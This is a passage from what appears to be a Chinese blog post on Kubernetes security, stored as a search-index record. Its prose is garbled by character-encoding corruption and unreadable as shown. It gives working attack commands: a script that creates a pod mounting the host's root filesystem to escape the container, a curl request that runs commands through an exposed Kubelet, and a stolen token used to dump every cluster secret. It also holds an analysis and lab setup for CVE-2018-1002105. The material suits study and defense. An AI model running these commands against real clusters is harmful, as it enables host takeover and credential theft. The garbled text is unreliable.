æä¾›æœåŠ¡ï¼Œæ— è®¤è¯å’Œæˆæƒæœºåˆ¶ï¼›åè€…ä»¥ HTTPS æä¾›æœåŠ¡ï¼Œæ”¯æŒè®¤è¯å’ŒæˆæƒæœåŠ¡ã€‚åœ¨è¾ƒæ–°ç‰ˆæœ¬çš„ Kubernetes ä¸­ï¼Œ8080 ç«¯å£çš„ HTTP æœåŠ¡é»˜è®¤ä¸å¯åŠ¨ã€‚ç„¶è€Œï¼Œå¦‚æœç”¨æˆ·åœ¨ /etc/kubernets/manifests/kube-apiserver.yaml ä¸­å°† --insecure-port=0 ä¿®æ”¹ä¸º --insecure-port=8080 ï¼Œå¹¶é‡å¯ API Serverï¼Œé‚£ä¹ˆæ”»å‡»è€…åªè¦ç½‘ç»œå¯è¾¾ï¼Œéƒ½èƒ½å¤Ÿé€šè¿‡æ­¤ç«¯å£æ“æ§é›†ç¾¤ã€‚ å¦‚è¿œç¨‹åˆ—å‡ºç›®æ ‡æœºå™¨ä¸Šè¿è¡Œçš„ podï¼š kubectl -s $TARGETIP:8080 get pod è¿›ä¸€æ­¥åˆ›å»ºæŒ‚è½½å®¿ä¸»æœºç›®å½•çš„ Pod è¿›è¡Œå®¹å™¨é€ƒé€¸ï¼Œè·å¾—å®¿ä¸»æœºæƒé™ï¼Œç›¸å…³æ“ä½œå¦‚ä¸‹ï¼š #!/bin/bash cat \u003c\u003c EOF \u003e escape.yaml # attacker.yaml apiVersion: v1 kind: Pod metadata: name: attacker spec: containers: - name: ubuntu image: ubuntu:latest imagePullPolicy: IfNotPresent # Just spin \u0026 wait forever command: [ \"/bin/bash\", \"-c\", \"--\" ] args: [ \"while true; do sleep 30; done;\" ] volumeMounts: - name: escape-host mountPath: /host-escape-door volumes: - name: escape-host hostPath: path: / EOF kubectl -s TARGET-IP:8080 apply -f escape.yaml sleep 8 kubectl -s TARGET-IP:8080 exec -it attacker /bin/bash ","date":"2021-11-30","objectID":"/2021/11/k8s%E5%AE%89%E5%85%A8/:2:1","tags":["äº‘åŸç”Ÿå®‰å…¨","k8s"],"title":"K8s å®‰å…¨","uri":"/2021/11/k8s%E5%AE%89%E5%85%A8/"},{"categories":["äº‘åŸç”Ÿå®‰å…¨"],"content":"2.2 Dashboard æœªæˆæƒè®¿é—® Kubernetes Dashboard æ˜¯ä¸€ä¸ªåŸºäº Web çš„ Kubernetes ç”¨æˆ·ç•Œé¢ã€‚å€ŸåŠ© Dashboardï¼Œèƒ½å¤Ÿè·å¾—å½“å‰é›†ç¾¤ä¸­åº”ç”¨è¿è¡ŒçŠ¶æ€çš„æ¦‚è§ˆï¼Œåˆ›å»ºæˆ–ä¿®æ”¹ Kubernetes èµ„æºã€‚ æ ¹æ®å®˜æ–¹æ–‡æ¡£ï¼Œå¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤éƒ¨ç½² Dashboard: kubectl apply -f https://raw.githubusercontent.com/kubernetes/dashboard/v2.4.0/aio/deploy/recommended.yaml Dashboard éœ€è¦é…ç½® token æ‰èƒ½å¤Ÿè®¿é—®ï¼Œä½†æ˜¯æä¾›äº†ã€Œè·³è¿‡ã€é€‰é¡¹ã€‚ä» 1.10.1 ç‰ˆæœ¬èµ·ï¼ŒDashboard é»˜è®¤ç¦ç”¨äº†ã€Œè·³è¿‡ã€æŒ‰é’®ã€‚ç„¶è€Œï¼Œå¦‚æœç”¨æˆ·åœ¨è¿è¡Œ Dashboard æ—¶æ·»åŠ äº† --enable-skip-loginï¼Œé‚£ä¹ˆæ”»å‡»è€…åªè¦ç½‘ç»œå¯è¾¾ï¼Œå°±èƒ½è¿›å…¥ Dashboardï¼š ä½¿ç”¨ä¸Šé¢çš„ recommended.yaml åˆ›å»º Dashboard æ˜¯å¯é çš„ã€‚å³ä½¿æ”»å‡»è€…â€œè·³è¿‡â€è®¤è¯ç›´æ¥ç™»å½•ï¼Œä¹Ÿå‡ ä¹æ²¡æœ‰åŠæ³•æ“ä½œã€‚ ","date":"2021-11-30","objectID":"/2021/11/k8s%E5%AE%89%E5%85%A8/:2:2","tags":["äº‘åŸç”Ÿå®‰å…¨","k8s"],"title":"K8s å®‰å…¨","uri":"/2021/11/k8s%E5%AE%89%E5%85%A8/"},{"categories":["äº‘åŸç”Ÿå®‰å…¨"],"content":"2.3 Kubelet æœªæˆæƒè®¿é—® åœ¨ä¸€ä¸ª Kubernetes é›†ç¾¤ä¸­ï¼ŒKubelet æ˜¯ä¸»è¦çš„èŠ‚ç‚¹ä»£ç†ï¼Œè¿è¡Œåœ¨é›†ç¾¤çš„æ¯ä¸ªèŠ‚ç‚¹ä¸Šã€‚å®ƒè´Ÿè´£å‘ API Server æ³¨å†Œæ‰€åœ¨èŠ‚ç‚¹ã€‚ Kubelet çš„é…ç½®æ–‡ä»¶æ˜¯ /var/lib/kubelet/config.yamlã€‚ä¸€èˆ¬æ¥è¯´ï¼Œæˆ‘ä»¬åœ¨å®‰è£… Kubernetes æ—¶ä¼šå°† --anonymous-auth è®¾ç½®ä¸º falseï¼Œå¹¶åœ¨ authorization ä¸­é€‰æ‹© mode ä¸º Webhookã€‚å‰ä¸€é€‰é¡¹ç¦æ­¢åŒ¿åç”¨æˆ·è®¿é—®ï¼Œåä¸€é€‰é¡¹åˆ™ä½¿ Kubelet é€šè¿‡ API Server è¿›è¡Œæˆæƒï¼ˆå³ä½¿åŒ¿åç”¨æˆ·èƒ½å¤Ÿè®¿é—´ï¼Œä¹Ÿå‡ ä¹ä¸å…·å¤‡ä»»ä½•æƒé™)ã€‚ ä½†æ˜¯ï¼Œä¸€æ—¦ --anonymous-auth è¢«è®¾ç½®ä¸º true, ä¸” authorization.mode è¢«è®¾ç½®ä¸º AlwaysAllow è¿™å°±éå¸¸å±é™©äº†ã€‚ æ›´æ”¹ config æ–‡ä»¶åï¼Œé‡å¯ Kubeletï¼šsystemctl restart kubeletã€‚ æ‰§è¡Œ curl -k -XPOST \"https://nodeip:10250/run/%namespace%/%pod_name%/%container_name%\" -d \"cmd=ls -la /\" å¯ä»¥åœ¨å¯¹åº”å®¹å™¨é‡Œæ‰§è¡Œå‘½ä»¤ã€‚ ç°åœ¨é—®é¢˜å˜æˆäº†å¦‚ä½•ç¡®å®š namespaceã€pod_nameã€container_nameã€‚è®¿é—® https://nodeip:10250/pods ã€‚åœ¨ metadata.namespace ä¸‹çš„å€¼ä¸º namespace, metadata.name ä¸‹çš„å€¼ä¸º pod_nameï¼Œspec.containers ä¸‹çš„ name å€¼ä¸º container_nameã€‚ æ‰§è¡Œå‘½ä»¤ï¼š è·å– Tokenï¼š é€šè¿‡ Token è·å– API Server æƒé™ï¼š kubectl --insecure-skip-tls-verify=true --server=\"https://ip:6443\" --token=\"eyJhbG......\" get secrets --all-namespaces ","date":"2021-11-30","objectID":"/2021/11/k8s%E5%AE%89%E5%85%A8/:2:3","tags":["äº‘åŸç”Ÿå®‰å…¨","k8s"],"title":"K8s å®‰å…¨","uri":"/2021/11/k8s%E5%AE%89%E5%85%A8/"},{"categories":["äº‘åŸç”Ÿå®‰å…¨"],"content":"3 k8s æƒé™æå‡æ¼æ´ - CVE-2018-1002105 CVE-2018-1002105 æ˜¯ä¸€ä¸ª Kubernetes çš„æƒé™æå‡æ¼æ´ï¼Œå…è®¸æ”»å‡»è€…åœ¨æ‹¥æœ‰é›†ç¾¤å†…ä½æƒé™çš„æƒ…å†µä¸‹æå‡æƒé™è‡³ Kubernetes API Server æƒé™ï¼ŒCVSS 3.x è¯„åˆ†ä¸º 9.8ã€‚ å½±å“ç‰ˆæœ¬ï¼š Kubernetes v1.0.x-1.9.x Kubernetes v1.10.0-1.10.10 (fixed in v1.10.11) Kubernetes v1.11.0-1.11.4 (fixed in v1.11.5) Kubernetes v1.12.0-1.12.2 (fixed in v1.12.3) ç®€å•æ¥è¯´ï¼Œé€šè¿‡æ„é€ ä¸€ä¸ªç‰¹æ®Šçš„è¯·æ±‚ï¼Œæ”»å‡»è€…èƒ½å¤Ÿå€ŸåŠ© Kubernetes API Server ä½œä¸ºä»£ç†ï¼Œå»ºç«‹ä¸€ä¸ªåˆ°åç«¯æœåŠ¡å™¨çš„è¿æ¥ï¼Œè¿›è€Œä»¥ Kubernetes API Server çš„èº«ä»½å‘åç«¯æœåŠ¡å™¨å‘é€ä»»æ„è¯·æ±‚ï¼Œå®è´¨ä¸Šå°±æ˜¯æƒé™æå‡ã€‚ åœ¨å¤šæ•°ç¯å¢ƒä¸‹ï¼Œä¸ºäº†æˆåŠŸåˆ©ç”¨æ¼æ´ï¼Œæ”»å‡»è€…æœ¬èº«éœ€è¦å…·å¤‡ä¸€å®šçš„æƒé™ï¼Œå¦‚å¯¹é›†ç¾¤å†…ä¸€ä¸ª Pod çš„ execã€attach æƒé™ã€‚ç„¶è€Œï¼Œåœ¨é›†ç¾¤ä¸­å­˜åœ¨å…¶ä»–æ‰©å±• API Server (å¦‚ metrics-server)çš„æƒ…å†µä¸‹ï¼Œåªè¦å…è®¸åŒ¿åè®¿é—®é›†ç¾¤ï¼Œæ”»å‡»è€…å°±å¯èƒ½ä»¥ç½®åç”¨æˆ·çš„èº«ä»½å®Œæˆæ¼æ´åˆ©ç”¨ã€‚ ","date":"2021-11-30","objectID":"/2021/11/k8s%E5%AE%89%E5%85%A8/:3:0","tags":["äº‘åŸç”Ÿå®‰å…¨","k8s"],"title":"K8s å®‰å…¨","uri":"/2021/11/k8s%E5%AE%89%E5%85%A8/"},{"categories":["äº‘åŸç”Ÿå®‰å…¨"],"content":"3.1 èƒŒæ™¯ 3.1.1 åŸºäºè§’è‰²çš„è®¿é—®æ§åˆ¶ - RBAC Role-Based Access Control(RBAC) æ˜¯ä¸ºä¸åŒç”¨æˆ·èµ‹äºˆä¸åŒçš„è§’è‰²ï¼Œé€šè¿‡è§’è‰²æˆæƒè¿›è¡Œè®¿é—®æ§åˆ¶ã€‚è¦å¯ç”¨ RBACï¼Œåœ¨å¯åŠ¨ API Server æ—¶è®¾ç½® --authorization-mode å‚æ•°ã€‚ Kubernetes æä¾›äº†å››ç§ RBAC å¯¹è±¡ï¼šRoleã€ClusterRoleã€Role Binding å’Œ ClusterRoleBindingã€‚ å…¶ä¸­ï¼ŒRole å’Œ ClusterRole ä»£è¡¨ä¸€ç³»åˆ—æƒé™çš„é›†åˆï¼Œä¸€ä¸ª Role èµ„æºé€šå¸¸æ˜¯ç‰¹å®šå‘½åç©ºé—´å†…æŸäº›æƒé™çš„é›†åˆï¼ŒClusterRole åˆ™æ˜¯æ— å‘½åç©ºé—´é™åˆ¶çš„èµ„æºã€‚ ä»¥å®˜æ–¹æ–‡æ¡£ä¸­çš„ä¾‹å­ï¼Œä¸‹é¢æ˜¯ä¸€ä¸ª Role çš„å£°æ˜æ–‡ä»¶ï¼Œå®ƒåœ¨é»˜è®¤çš„å‘½åç©ºé—´åˆ›å»ºäº†ä¸€ä¸ªåä¸º pod-reader çš„è§’è‰²ï¼Œè¿™è§’è‰²çš„æƒé™æ˜¯èƒ½å¤Ÿå¯¹å‘½åç©ºé—´å†…éƒ¨çš„ Pod è¿›è¡ŒæŸ¥çœ‹ã€äº‹ä»¶ç›‘å¬å’Œåˆ—ä¸¾æ“ä½œã€‚ apiVersion: rbac.authorization.k8s.io/v1 kind: Role metadata: namespace: default name: pod-reader rules: - apiGroups: [\"\"] # \"\" æ ‡æ˜ core API ç»„ resources: [\"pods\"] verbs: [\"get\", \"watch\", \"list\"] RoleBinding å’Œ ClusterRoleBinding åˆ™ç”¨æ¥å°† Role å’Œ ClusterRole å®šä¹‰çš„æƒé™èµ‹äºˆä¸€ä¸ªæˆ–ä¸€ç»„ç‰¹å®šçš„ç”¨æˆ·ã€‚ ä¸‹é¢çš„ä¾‹å­ä¸­çš„ RoleBinding å°† pod-reader Role æˆäºˆåœ¨ default å‘½åç©ºé—´ä¸­çš„ç”¨æˆ· janeã€‚ è¿™æ ·ï¼Œç”¨æˆ· jane å°±å…·æœ‰äº†è¯»å– default å‘½åç©ºé—´ä¸­ pods çš„æƒé™ã€‚ apiVersion: rbac.authorization.k8s.io/v1 # æ­¤è§’è‰²ç»‘å®šå…è®¸ \"jane\" è¯»å– \"default\" åå­—ç©ºé—´ä¸­çš„ Pods kind: RoleBinding metadata: name: read-pods namespace: default subjects: # ä½ å¯ä»¥æŒ‡å®šä¸æ­¢ä¸€ä¸ªâ€œsubjectï¼ˆä¸»ä½“ï¼‰â€ - kind: User name: jane # \"name\" æ˜¯åŒºåˆ†å¤§å°å†™çš„ apiGroup: rbac.authorization.k8s.io roleRef: # \"roleRef\" æŒ‡å®šä¸æŸ Role æˆ– ClusterRole çš„ç»‘å®šå…³ç³» kind: Role # æ­¤å­—æ®µå¿…é¡»æ˜¯ Role æˆ– ClusterRole name: pod-reader # æ­¤å­—æ®µå¿…é¡»ä¸ä½ è¦ç»‘å®šçš„ Role æˆ– ClusterRole çš„åç§°åŒ¹é… apiGroup: rbac.authorization.k8s.io 3.1.2 WebSocket WebSocket æ˜¯ä¸€ç§ç½‘ç»œä¼ è¾“åè®®ï¼Œå¯åœ¨å•ä¸ª TCP è¿æ¥ä¸Šè¿›è¡Œå…¨åŒå·¥é€šä¿¡ï¼Œä½¿å¾—å®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨ä¹‹é—´çš„æ•°æ®äº¤æ¢å˜å¾—æ›´åŠ ç®€å•ï¼Œå…è®¸æœåŠ¡ç«¯ä¸»åŠ¨å‘å®¢æˆ·ç«¯æ¨é€æ•°æ®ã€‚åœ¨ WebSocket APIä¸­ï¼Œæµè§ˆå™¨å’ŒæœåŠ¡å™¨åªéœ€è¦å®Œæˆä¸€æ¬¡æ¡æ‰‹ï¼Œä¸¤è€…ä¹‹é—´å°±å¯ä»¥åˆ›å»ºæŒä¹…æ€§çš„è¿æ¥ï¼Œå¹¶è¿›è¡ŒåŒå‘æ•°æ®ä¼ è¾“ã€‚ ä¸€ä¸ªå…¸å‹çš„ Websocket æ¡æ‰‹è¯·æ±‚å¦‚ä¸‹ï¼š å®¢æˆ·ç«¯è¯·æ±‚ï¼š GET /chat HTTP/1.1 Host: server.example.com Upgrade: websocket Connection: Upgrade Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ== Origin: http://example.com Sec-WebSocket-Protocol: chat, superchat Sec-WebSocket-Version: 13 æœåŠ¡å™¨å›åº”ï¼š HTTP/1.1 101 Switching Protocols Upgrade: websocket Connection: Upgrade Sec-WebSocket-Accept: s3pPLMBiTxaQ9kYGzzhZRbK+xOo= Sec-WebSocket-Protocol: chat 3.1.3 Kubernetes API Server API Server é€šè¿‡ RESTful API æä¾›æœåŠ¡ã€‚é™¤æ­¤ä¹‹å¤–ï¼Œå®ƒè¿˜å…·æœ‰ä»£ç†è½¬å‘çš„åŠŸèƒ½ï¼Œå°†å¤–ç•Œå¯¹äºéƒ¨åˆ† APIçš„è°ƒç”¨è½¬å‘åˆ°åç«¯å®é™…æ‰§è¡Œè¿™äº› API åŠŸèƒ½çš„ç»„ä»¶ä¸Šã€‚ä¾‹å¦‚ï¼Œå¸¸ç”¨çš„å¯¹ pod æ‰§è¡Œ exec çš„æ“ä½œå°±æ˜¯ API Server ä½œä¸ºä»£ç†ï¼Œå°†è¯·æ±‚è½¬å‘åˆ°å¯¹åº”èŠ‚ç‚¹çš„ Kubelet ä¸Šï¼Œç”±è¯¥ Kubelet æ‰§è¡Œå…·ä½“å‘½ä»¤ã€‚è¿™ä¸ªè¿‡ç¨‹è¿˜æ¶‰åŠä» HTTP åˆ° Websocket çš„åè®®å‡çº§è¿‡ç¨‹ï¼ŒAPI Server èƒ½å¤Ÿä½œä¸ºä»£ç†ç»´æŠ¤ä¸€æ¡ WebSocket è¿æ¥ã€‚ ","date":"2021-11-30","objectID":"/2021/11/k8s%E5%AE%89%E5%85%A8/:3:1","tags":["äº‘åŸç”Ÿå®‰å…¨","k8s"],"title":"K8s å®‰å…¨","uri":"/2021/11/k8s%E5%AE%89%E5%85%A8/"},{"categories":["äº‘åŸç”Ÿå®‰å…¨"],"content":"3.2 åˆ†æ æ¼æ´åœ¨ staging/src/k8s.io/apimachinery/pkg/util/proxy/upgradeaware.go ä¸­ã€‚upgradeaware ä¸»è¦å¤„ç† API Server çš„ä»£ç†é€»è¾‘ã€‚å…¶ä¸­ ServerHTTP å‡½æ•°ç”¨æ¥å¤„ç†ä»£ç†è¯·æ±‚ã€‚ // staging/src/k8s.io/apimachinery/pkg/util/proxy/upgradeaware.go // ServeHTTP handles the proxy request func (h *UpgradeAwareHandler) ServeHTTP(w http.ResponseWriter, req *http.Request) { if h.tryUpgrade(w, req) { return } if h.UpgradeRequired { h.Responder.Error(w, req, errors.NewBadRequest(\"Upgrade request required\")) return } ... } } å®ƒåœ¨æœ€å¼€å§‹è°ƒç”¨äº† tryUpgrade å‡½æ•°ï¼Œå°è¯•è¿›è¡Œåè®®å‡çº§ã€‚æ¼æ´æ­£å­˜åœ¨äºè¯¥å‡½æ•°çš„å¤„ç†é€»è¾‘ä¹‹ä¸­ï¼Œè·Ÿè¿›è¯¥å‡½æ•°ã€‚ é¦–å…ˆï¼Œè¯¥å‡½æ•°è¦åˆ¤æ–­åŸå§‹è¯·æ±‚æ˜¯å¦ä¸ºåè®®å‡çº§è¯·æ±‚ï¼ˆè¯·æ±‚å¤´ä¸­æ˜¯å¦åŒ…å« Connection å’Œ Upgrade é¡¹ï¼‰ï¼š // tryUpgrade returns true if the request was handled. if !httpstream.IsUpgradeRequest(req) { glog.V(6).Infof(\"Request was not an upgrade\") return false } æ¥ç€ï¼Œå®ƒå»ºç«‹äº†åˆ°åç«¯æœåŠ¡çš„è¿æ¥ï¼š if h.InterceptRedirects { glog.V(6).Infof(\"Connecting to backend proxy (intercepting redirects) %s\\n Headers: %v\", \u0026location, clone.Header) backendConn, rawResponse, err = utilnet.ConnectWithRedirects(req.Method, \u0026location, clone.Header, req.Body, utilnet.DialerFunc(h.DialForUpgrade), h.RequireSameHostRedirects) } else { glog.V(6).Infof(\"Connecting to backend proxy (direct dial) %s\\n Headers: %v\", \u0026location, clone.Header) clone.URL = \u0026location backendConn, err = h.DialForUpgrade(clone) } if err != nil { glog.V(6).Infof(\"Proxy connection error: %v\", err) h.Responder.Error(w, req, err) return true } defer backendConn.Close() ç„¶åï¼ŒtryUpgrade å‡½æ•°è¿›è¡Œäº† HTTP Hijack æ“ä½œï¼Œç®€å•æ¥è¯´ï¼Œå°±æ˜¯ä¸å†å°† HTTP è¿æ¥å¤„ç†å§”æ‰˜ç»™ Go è¯­è¨€å†…ç½®çš„å¤„ç†æµç¨‹ï¼Œç¨‹åºè‡ªèº«åœ¨ TCP è¿æ¥åŸºç¡€ä¸Šè¿›è¡Œ HTTP äº¤äº’ï¼Œè¿™æ˜¯ä» HTTP å‡çº§åˆ° WebSocket çš„å…³é”®æ­¥éª¤ä¹‹ä¸€ï¼š éšåï¼ŒtryUpgrade å°†åç«¯é’ˆå¯¹ä¸Šä¸€æ¬¡è¯·æ±‚çš„å“åº”è¿”å›ç»™å®¢æˆ·ç«¯ï¼š å‡½æ•°çš„æœ€åï¼Œå®¢æˆ·ç«¯åˆ°åç«¯æœåŠ¡çš„ä»£ç†é€šé“è¢«å»ºç«‹èµ·æ¥ã€‚ // Proxy the connection. writerComplete := make(chan struct{}) readerComplete := make(chan struct{}) go func() { ... }() go func() { ... }() // Wait for one half the connection to exit. Once it does the defer will // clean up the other half of the connection. select { case \u003c-writerComplete: case \u003c-readerComplete: } glog.V(6).Infof(\"Disconnecting from backend proxy %s\\n Headers: %v\", \u0026location, clone.Header) return true è¿™æ˜¯ API Server è§†è§’ä¸‹å»ºç«‹ä»£ç†çš„æµç¨‹ã€‚é‚£ä¹ˆï¼Œåœ¨è¿™ä¸ªè¿‡ç¨‹ä¸­ï¼Œåç«¯æœåŠ¡åˆæ˜¯å¦‚ä½•å‚ä¸çš„å‘¢ï¼Ÿ ä»¥ Kubelet ä¸ºä¾‹ï¼Œå½“ç”¨æˆ·å¯¹æŸä¸ª Pod æ‰§è¡Œ exec æ“ä½œæ—¶ï¼Œè¯¥è¯·æ±‚ç»è¿‡ä¸Šé¢ API Server çš„ä»£ç†ï¼Œå‘ç»™ Kubeletã€‚ Kubelet åœ¨åˆå§‹åŒ–æ—¶ä¼šå¯åŠ¨ä¸€ä¸ªè‡ªå·±çš„ API Serverï¼ˆä¸ºä¾¿äºåŒºåˆ†ï¼Œåæ–‡æ‰€æœ‰å•ç‹¬å‡ºç°çš„ API Server å‡æŒ‡çš„æ˜¯ Kubernetes API Serverï¼Œç”¨ Kubelet API Server æŒ‡ä»£ Kubelet å†…éƒ¨çš„ API Server)ã€‚ Kubelet å¯åŠ¨æ—¶ä¼šæ³¨å†Œä¸€ç³»åˆ— APIï¼Œ/exec å°±åœ¨å…¶ä¸­ï¼ˆç”± installDebuggingHandlers å‡½æ•°æ³¨å†Œï¼‰ï¼Œæ³¨æœ‹çš„å¯¹åº”å¤„ç†å‡½æ•°ä¸ºï¼š å…·ä½“ä»£ç å¦‚ä¸‹ï¼špkg/kubelet/server/server.go å½“å®¢æˆ·ç«¯å‘èµ·ä¸€ä¸ªå¯¹ Pod æ‰§è¡Œ exec æ“ä½œçš„è¯·æ±‚æ—¶ï¼Œç»è¿‡ API Server çš„ä»£ç†ã€Kubelet çš„è½¬å‘ï¼Œæœ€ç»ˆå®¢æˆ·ç«¯ä¸ Pod é—´å»ºç«‹èµ·äº†è¿æ¥ã€‚ é—®é¢˜å¯èƒ½å‡ºç°åœ¨å¦‚ä¸‹åœ°æ–¹ï¼š å¦‚æœè¯·æ±‚æœ¬èº«ä¸å…·æœ‰ç›¸åº” Pod çš„æ“ä½œæƒé™ï¼Œå®ƒåœ¨ API Server ç¯èŠ‚å°±ä¼šè¢«æ‹¦æˆªä¸‹æ¥ï¼Œä¸ä¼šåˆ°è¾¾ Kubeletï¼Œè¿™ä¸ªå¤„ç†æ²¡æœ‰é—®é¢˜ã€‚ å¦‚æœè¯·æ±‚æœ¬èº«å…·æœ‰ç›¸åº” Pod çš„æ“ä½œæƒé™ï¼Œä¸”è¯·æ±‚ç¬¦åˆ API è¦æ±‚ï¼ˆURL æ­£ç¡®ã€å‚æ•°é½å…¨ç­‰)ï¼ŒAPI Server å»ºç«‹èµ·ä»£ç†ï¼ŒKubelet å°†æµé‡è½¬å‘åˆ° Pod ä¸Šï¼Œä¸€æ¡å®¢æˆ·ç«¯åˆ°æŒ‡å®š Pod çš„å‘½ä»¤æ‰§è¡Œè¿æ¥è¢«å»ºç«‹ï¼Œè¿™ä¹Ÿæ²¡æœ‰é—®é¢˜ï¼Œå› ä¸ºå®¢æˆ·ç«¯æœ¬èº«å…·æœ‰ç›¸åº” Pod çš„æ“ä½œæƒé™ã€‚ å¦‚æœè¯·æ±‚æœ¬èº«å…·æœ‰ç›¸åº” Pod çš„æ“ä½œæƒé™ï¼Œä½†æ˜¯å‘å‡ºçš„è¯·æ±‚å¹¶ä¸ç¬¦åˆ API è¦æ±‚ï¼ˆå¦‚å‚æ•°æŒ‡å®šé”™è¯¯ç­‰)ï¼ŒAPI Server åŒæ ·ä¼šå»ºç«‹èµ·ä»£ç†ï¼Œå°†è¯·æ±‚è½¬å‘ç»™ Kubeletï¼Œè¿™ç§æƒ…å†µä¸‹ä¼šå‘ç”Ÿä»€ä¹ˆå‘¢ï¼Ÿ ä¸Šé¢ä»£ç çš„ 694 è¡Œï¼Œåœ¨ Kubelet çš„ /exec å¤„ç†å‡½æ•° getExec ä¸­ï¼Œä¸€ä¸ª Options å®ä¾‹è¢«åˆ›å»ºï¼Œè·Ÿè¿› NewOptions å‡½æ•°ï¼špkg/kubelet/server/remotecommand/httpstream.go åœ¨ç¬¬ 61 è¡Œï¼Œå¦‚æœè¯·æ±‚ä¸­ stdinã€stdout å’Œ stderr ä¸‰ä¸ªå‚æ•°éƒ½æ²¡æœ‰ç»™å‡ºï¼ŒOptions å®ä¾‹å°†åˆ›å»ºå¤±è´¥ï¼ŒgetExec å‡½æ•°å°†ç›´æ¥è¿”å›ç»™å®¢æˆ·ç«¯ä¸€ä¸ª http.StatusBadRequest ä¿¡æ¯ï¼š if err != nil { utilruntime.HandleError(err) response.WriteError(http.StatusBadRequest, err) return } å›åˆ°ä¸Šé¢çš„ç¬¬ä¸‰ç§æƒ…å†µã€‚ç»“åˆ API Server ä¸­ tryUpgrade ä»£ç å¯ä»¥å‘ç°ï¼ŒAPI Server å¹¶æ²¡æœ‰å¯¹è¿™ç§é”™è¯¯æƒ…å†µè¿›è¡Œå¤„ç†ï¼Œä¾ç„¶é€šè¿‡ä¸¤ä¸ª Goroutine ä¸ºå®¢æˆ·ç«¯åˆ° Kubelet å»ºç«‹äº† Websocket è¿æ¥ã€‚é—®é¢˜çš„æ ¸å¿ƒåœ¨äºï¼Œè¿™ä¸ªè¿æ¥å¹¶æ²¡æœ‰å¯¹æ¥åˆ°æŸä¸ª Pod ä¸Šï¼ˆå› ä¸ºå‰é¢ getExec å¤±è´¥è¿”å›äº†ï¼‰ï¼Œä¹Ÿæ²¡æœ‰è¢«é”€æ¯ï¼Œå®¢æˆ·ç«¯å¯ä»¥ç»§ç»­é€šè¿‡è¿™ä¸ªè¿æ¥å‘ Kubelet ä¸‹å‘æŒ‡ä»¤ã€‚ç”±äºç»è¿‡äº† API Server çš„ä»£ç†ï¼Œå› æ­¤æŒ‡ä»¤æ˜¯ä»¥ API Server çš„æƒé™å‘ Kubelet ä¸‹å‘çš„ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œå®¢æˆ·ç«¯è‡ªæ­¤èƒ½å¤Ÿè‡ªç”±å‘è¯¥ Kubelet ä¸‹å‘æŒ‡ä»¤è€Œä¸å—é™åˆ¶ï¼Œä»è€Œå®ç°äº†æƒé™æå‡ï¼Œè¿™å°±æ˜¯ CVE-2018-1002105 æ¼æ´çš„æˆå› ã€‚ ","date":"2021-11-30","objectID":"/2021/11/k8s%E5%AE%89%E5%85%A8/:3:2","tags":["äº‘åŸç”Ÿå®‰å…¨","k8s"],"title":"K8s å®‰å…¨","uri":"/2021/11/k8s%E5%AE%89%E5%85%A8/"},{"categories":["äº‘åŸç”Ÿå®‰å…¨"],"content":"3.3 å¤ç° 3.3.1 å‰ç½®æ¡ä»¶ æ­£å¸¸è¯·æ±‚æ‰§è¡Œçš„é“¾è·¯æ˜¯ client --\u003e apiserver --\u003e kubelet å³ client é¦–å…ˆå¯¹ apiserver å‘èµ·è¯·æ±‚ï¼Œä¾‹å¦‚å‘é€è¯·æ±‚ [è¿æ¥æŸä¸€ä¸ªå®¹å™¨å¹¶æ‰§è¡Œ exec] ï¼Œè¯·æ±‚é¦–å…ˆä¼šè¢«å‘åˆ° apiserverï¼Œapiserver æ”¶åˆ°è¯·æ±‚åé¦–å…ˆå¯¹è¯¥è¯·æ±‚è¿›è¡Œè®¤è¯æ ¡éªŒï¼Œå¦‚æœæ­¤æ—¶ä½¿ç”¨çš„æ˜¯åŒ¿åç”¨æˆ·ï¼Œapi server ä¸Šæ˜¯å¯ä»¥é€šè¿‡è®¤è¯çš„ï¼Œä½†ä¼šæˆæƒå¤±è´¥ï¼Œå³ client åªèƒ½èµ°åˆ° apiserver è€Œåˆ°ä¸äº† kubelet å°±è¢«è¿”å› 403 å¹¶æ–­å¼€è¿æ¥äº†ã€‚ æ‰€ä»¥æœ¬æ¬¡æ”»å‡»çš„å…ˆå†³æ¡ä»¶æ˜¯ï¼Œéœ€è¦æœ‰ä¸€ä¸ªå¯ä»¥ä» client åˆ° apiserver åˆ° kubelet æ•´ä¸ªé“¾è·¯é€šä¿¡è®¤è¯é€šè¿‡çš„ç”¨æˆ·ã€‚ 3.3.2 æ¼æ´ç¯å¢ƒæ­å»º åˆ©ç”¨ metarget å®‰è£…æ¼æ´ç¯å¢ƒï¼š ./metarget cnv install cve-2018-1002105 --domestic æ¨¡æ‹Ÿæ”»å‡»åœºæ™¯ï¼šé›†ç¾¤ä¸­å­˜åœ¨ä¸€ä¸ª vul çš„å‘½åç©ºé—´ï¼Œå…¶ä¸­å­˜åœ¨ä¸€ä¸ªè¿è¡Œçš„ä¸šåŠ¡ Podã€‚æ”»å‡»è€…å…·æœ‰ vul å‘½åç©ºé—´ä¸‹ Pod çš„ exec æƒé™ï¼Œä½†æ˜¯ä¸å…·æœ‰å…¶å®ƒé«˜çº§æƒé™ã€‚é€šè¿‡è¯¥æ¼æ´è¿›è¡Œææƒã€‚ åˆ›å»º vul å‘½åç©ºé—´ # cve_2018_1002105_namespace.yaml apiVersion: v1 kind: Namespace metadata: name: vul åˆ›å»ºè§’è‰² testï¼Œå¹¶èµ‹äºˆæƒé™ # cve_2018_1002105_role.yaml apiVersion: rbac.authorization.k8s.io/v1 kind: Role metadata: name: test namespace: vul rules: - apiGroups: - \"\" resources: - pods verbs: - get - list - delete - watch - apiGroups: - \"\" resources: - pods/exec verbs: - create - get åˆ›å»ºç”¨æˆ· testï¼Œå¹¶ä¸è§’è‰² test ç»‘å®š # cve_2018_1002105_role_binding.yaml apiVersion: rbac.authorization.k8s.io/v1 kind: RoleBinding metadata: name: test namespace: vul roleRef: apiGroup: rbac.authorization.k8s.io kind: Role name: test subjects: - apiGroup: rbac.authorization.k8s.io kind: Group name: test åœ¨å‘½åç©ºé—´ vul å†…åˆ›å»ºæµ‹è¯•ä¸šåŠ¡ Podï¼š # cve_2018_1002105_pod.yaml apiVersion: v1 kind: Pod metadata: name: test namespace: vul spec: containers: - name: ubuntu image: ubuntu:latest imagePullPolicy: IfNotPresent # Just spin \u0026 wait forever command: [ \"/bin/bash\", \"-c\", \"--\" ] args: [ \"while true; do sleep 30; done;\" ] 